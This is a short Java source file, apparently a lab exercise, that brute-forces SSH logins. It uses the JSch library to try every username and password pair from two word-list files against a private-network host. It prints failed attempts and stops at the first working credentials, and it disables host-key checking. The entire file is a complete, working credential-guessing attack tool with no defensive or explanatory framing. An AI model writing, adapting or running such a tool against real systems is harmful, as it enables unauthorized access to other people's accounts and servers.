package org.example;

import com.jcraft.jsch.*;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

public class SSHBruteForce {

    public static void main(String[] args) {
        String host = "10.0.2.15";
        int port = 22;
        // give the path of the files
        String usernamesFile = "user.txt";
        String passwordsFile = "password.txt";

        try (BufferedReader userReader = new BufferedReader(new FileReader(usernamesFile))) {
            String username;
            while ((username = userReader.readLine()) != null) {

                try (BufferedReader passReader = new BufferedReader(new FileReader(passwordsFile))) {
                    String password;
                    while ((password = passReader.readLine()) != null) {

                        if (trySSHLogin(host, port, username.trim(), password.trim())) {
                            System.out.println("[+] SUCCESS: " + username + ":" + password);
                            return;
                        } else {
                            System.out.println("[-] Failed: " + username + ":" + password);
                        }
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static boolean trySSHLogin(String host, int port, String username, String password) {
        JSch jsch = new JSch();
        Session session = null;

        try {
            session = jsch.getSession(username, host, port);
            session.setPassword(password);

            // skip asking for key confirmation
            session.setConfig("StrictHostKeyChecking", "no");

            session.connect(3000); // 3-second timeout
            session.disconnect();
            return true;

        } catch (JSchException e) {
            return false;
        }
    }
}
